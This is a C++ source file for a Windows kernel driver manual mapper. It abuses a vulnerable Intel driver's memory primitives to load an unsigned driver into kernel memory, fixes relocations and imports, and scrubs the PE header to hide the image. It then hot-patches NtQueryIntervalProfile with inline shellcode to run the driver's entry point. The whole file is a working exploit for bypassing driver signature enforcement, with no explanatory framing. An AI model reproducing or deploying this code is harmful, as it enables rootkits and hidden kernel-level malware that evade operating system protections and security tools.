#include "../include/mapper.h"
#include "../include/intel_driver.h"
#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <Psapi.h>

#pragma comment(lib, "Psapi.lib")
#include <winternl.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif

uint64_t GetNtoskrnlBase()
{
    LPVOID mods[1024]; DWORD needed = 0;
    if (!EnumDeviceDrivers(mods, sizeof(mods), &needed)) return 0;
    DWORD cnt = needed / sizeof(LPVOID);
    WCHAR name[MAX_PATH];
    for (DWORD i = 0; i < cnt; i++) {
        if (GetDeviceDriverBaseNameW(mods[i], name, MAX_PATH))
            if (!_wcsicmp(name, L"ntoskrnl.exe") || !_wcsicmp(name, L"ntkrnlmp.exe"))
                return (uint64_t)mods[i];
    }
    return 0;
}

uint64_t GetKernelProcAddress(uint64_t ntoskrnlKernelBase, const char* funcName)
{
    HMODULE hNtos = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) return 0;
    uint64_t local = (uint64_t)GetProcAddress(hNtos, funcName);
    uint64_t base = (uint64_t)hNtos;
    FreeLibrary(hNtos);
    if (!local) return 0;
    return ntoskrnlKernelBase + (local - base);
}

bool ParsePeHeaders(const uint8_t* raw, size_t rawSize, MapContext& ctx)
{
    if (rawSize < sizeof(IMAGE_DOS_HEADER)) return false;
    auto* dos = (const IMAGE_DOS_HEADER*)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto* nt = (const IMAGE_NT_HEADERS64*)(raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;

    ctx.KernelSize = nt->OptionalHeader.SizeOfImage;
    ctx.EntryPointRVA = nt->OptionalHeader.AddressOfEntryPoint;
    ctx.LocalSize = ctx.KernelSize;
    ctx.LocalCopy = (uint8_t*)VirtualAlloc(nullptr, ctx.LocalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!ctx.LocalCopy) return false;
    memset(ctx.LocalCopy, 0, ctx.LocalSize);
    memcpy(ctx.LocalCopy, raw, nt->OptionalHeader.SizeOfHeaders);
    return true;
}

bool CopySections(const uint8_t* raw, MapContext& ctx)
{
    auto* dos = (const IMAGE_DOS_HEADER*)raw;
    auto* nt = (const IMAGE_NT_HEADERS64*)(raw + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->SizeOfRawData) continue;
        if (sec->VirtualAddress + sec->SizeOfRawData > ctx.LocalSize) return false;
        memcpy(ctx.LocalCopy + sec->VirtualAddress, raw + sec->PointerToRawData, sec->SizeOfRawData);
    }
    return true;
}

bool FixRelocations(const uint8_t* raw, MapContext& ctx)
{
    auto* dos = (const IMAGE_DOS_HEADER*)raw;
    auto* nt = (const IMAGE_NT_HEADERS64*)(raw + dos->e_lfanew);
    int64_t delta = (int64_t)(ctx.KernelBase - nt->OptionalHeader.ImageBase);
    if (!delta) return true;

    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!dir.VirtualAddress) return (delta == 0);

    auto* reloc = (const IMAGE_BASE_RELOCATION*)(ctx.LocalCopy + dir.VirtualAddress);
    uint32_t done = 0;
    while (done < dir.Size && reloc->VirtualAddress) {
        uint32_t cnt = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        auto* entries = (const WORD*)((const uint8_t*)reloc + sizeof(IMAGE_BASE_RELOCATION));
        for (uint32_t i = 0; i < cnt; i++) {
            if ((entries[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                uint64_t* p = (uint64_t*)(ctx.LocalCopy + reloc->VirtualAddress + (entries[i] & 0xFFF));
                *p += (uint64_t)delta;
            }
        }
        done += reloc->SizeOfBlock;
        reloc = (const IMAGE_BASE_RELOCATION*)((const uint8_t*)reloc + reloc->SizeOfBlock);
    }
    return true;
}

bool ResolveImports(const uint8_t* raw, MapContext& ctx)
{
    auto* dos = (const IMAGE_DOS_HEADER*)raw;
    auto* nt = (const IMAGE_NT_HEADERS64*)(raw + dos->e_lfanew);
    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dir.VirtualAddress) return true;

    uint64_t ntoskrnl = GetNtoskrnlBase();
    auto* desc = (const IMAGE_IMPORT_DESCRIPTOR*)(ctx.LocalCopy + dir.VirtualAddress);

    while (desc->Name) {
        auto* thunk = (IMAGE_THUNK_DATA64*)(ctx.LocalCopy + desc->FirstThunk);
        auto* oThunk = (const IMAGE_THUNK_DATA64*)(ctx.LocalCopy +
            (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));

        while (oThunk->u1.AddressOfData) {
            uint64_t addr = 0;
            if (!(oThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)) {
                auto* ibn = (const IMAGE_IMPORT_BY_NAME*)(ctx.LocalCopy + oThunk->u1.AddressOfData);
                addr = GetKernelProcAddress(ntoskrnl, ibn->Name);
                if (!addr) {
                    std::cerr << "[mapper] unresolved: " << ibn->Name << "\n";
                    return false;
                }
            }
            thunk->u1.Function = addr;
            thunk++; oThunk++;
        }
        desc++;
    }
    return true;
}

bool AllocateKernelMemory(MapContext& ctx)
{
    HANDLE h = IntelDriver::GetHandle();
    ctx.KernelBase = IntelDriver::AllocatePool(h, ctx.KernelSize);
    if (!ctx.KernelBase) {
        std::cerr << "[mapper] AllocPool failed\n";
        return false;
    }
    std::cout << "[mapper] kernel alloc @ 0x" << std::hex << ctx.KernelBase << " (" << std::dec << ctx.KernelSize << " bytes)\n";
    return true;
}

bool WriteToKernel(MapContext& ctx)
{
    return IntelDriver::WriteKernelMemory(
        IntelDriver::GetHandle(), ctx.KernelBase, ctx.LocalCopy, ctx.LocalSize);
}

static void ScrubPeHeader(MapContext& ctx)
{
    auto* dos = (const IMAGE_DOS_HEADER*)ctx.LocalCopy;
    auto* nt = (const IMAGE_NT_HEADERS64*)(ctx.LocalCopy + dos->e_lfanew);
    size_t headerSize = nt->OptionalHeader.SizeOfHeaders;
    std::vector<uint8_t> zeros(headerSize, 0);
    IntelDriver::WriteKernelMemory(IntelDriver::GetHandle(), ctx.KernelBase, zeros.data(), headerSize);
    std::cout << "[mapper] PE header scrubbed (" << headerSize << " bytes)\n";
}

NTSTATUS CallDriverEntry(MapContext& ctx)
{
    HANDLE h = IntelDriver::GetHandle();
    if (h == INVALID_HANDLE_VALUE) return STATUS_INVALID_HANDLE;

    uint64_t ntoskrnl = GetNtoskrnlBase();
    uint64_t entryPoint = ctx.KernelBase + ctx.EntryPointRVA;
    uint64_t ntqipKernel = GetKernelProcAddress(ntoskrnl, "NtQueryIntervalProfile");
    if (!ntqipKernel) {
        std::cerr << "[mapper] NtQueryIntervalProfile not found\n";
        return STATUS_UNSUCCESSFUL;
    }

    uint8_t shellcode[] = {
        0x48, 0x31, 0xC9, 0x48, 0x31, 0xD2, 0x48, 0xB8,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0xFF, 0xD0, 0xC3
    };
    *reinterpret_cast<uint64_t*>(shellcode + 8) = entryPoint;

    uint8_t origBytes[sizeof(shellcode)] = {};
    IntelDriver::ReadKernelMemory(h, origBytes, ntqipKernel, sizeof(shellcode));
    IntelDriver::WriteKernelMemory(h, ntqipKernel, shellcode, sizeof(shellcode));

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        using NtQIP_t = NTSTATUS(NTAPI*)(ULONG, PULONG);
        auto fn = (NtQIP_t)GetProcAddress(hNtdll, "NtQueryIntervalProfile");
        if (fn) {
            ULONG interval = 0;
            fn(0, &interval);
        }
    }

    IntelDriver::WriteKernelMemory(h, ntqipKernel, origBytes, sizeof(shellcode));
    std::cout << "[mapper] DriverEntry called, NtQueryIntervalProfile restored\n";
    return STATUS_SUCCESS;
}

void FreeMapContext(MapContext& ctx)
{
    if (ctx.LocalCopy) {
        VirtualFree(ctx.LocalCopy, 0, MEM_RELEASE);
        ctx.LocalCopy = nullptr;
    }
}

NTSTATUS MapDriver(const std::wstring& driverPath)
{
    std::ifstream file(driverPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return STATUS_OBJECT_NAME_NOT_FOUND;

    size_t fsz = (size_t)file.tellg();
    file.seekg(0);
    std::vector<uint8_t> raw(fsz);
    file.read((char*)raw.data(), fsz);
    file.close();

    MapContext ctx{};
    const uint8_t* rawPtr = raw.data();

    std::cout << "[mapper] parsing PE...\n";
    if (!ParsePeHeaders(rawPtr, fsz, ctx)) return STATUS_INVALID_IMAGE_FORMAT;

    std::cout << "[mapper] copying sections...\n";
    if (!CopySections(rawPtr, ctx)) { FreeMapContext(ctx); return STATUS_INVALID_IMAGE_FORMAT; }

    std::cout << "[mapper] allocating kernel memory...\n";
    if (!AllocateKernelMemory(ctx)) { FreeMapContext(ctx); return STATUS_INSUFFICIENT_RESOURCES; }

    std::cout << "[mapper] fixing relocations...\n";
    if (!FixRelocations(rawPtr, ctx)) {
        IntelDriver::FreePool(IntelDriver::GetHandle(), ctx.KernelBase);
        FreeMapContext(ctx); return STATUS_INVALID_IMAGE_FORMAT;
    }

    std::cout << "[mapper] resolving imports...\n";
    if (!ResolveImports(rawPtr, ctx)) {
        IntelDriver::FreePool(IntelDriver::GetHandle(), ctx.KernelBase);
        FreeMapContext(ctx); return STATUS_DRIVER_ENTRYPOINT_NOT_FOUND;
    }

    std::cout << "[mapper] writing to kernel...\n";
    if (!WriteToKernel(ctx)) {
        IntelDriver::FreePool(IntelDriver::GetHandle(), ctx.KernelBase);
        FreeMapContext(ctx); return STATUS_UNSUCCESSFUL;
    }

    std::cout << "[mapper] scrubbing PE header...\n";
    ScrubPeHeader(ctx);

    std::cout << "[mapper] calling DriverEntry...\n";
    NTSTATUS status = CallDriverEntry(ctx);
    FreeMapContext(ctx);

    if (NT_SUCCESS(status))
        std::cout << "[mapper] mapped successfully\n";
    else
        std::cerr << "[mapper] DriverEntry failed: 0x" << std::hex << status << "\n";

    return status;
}
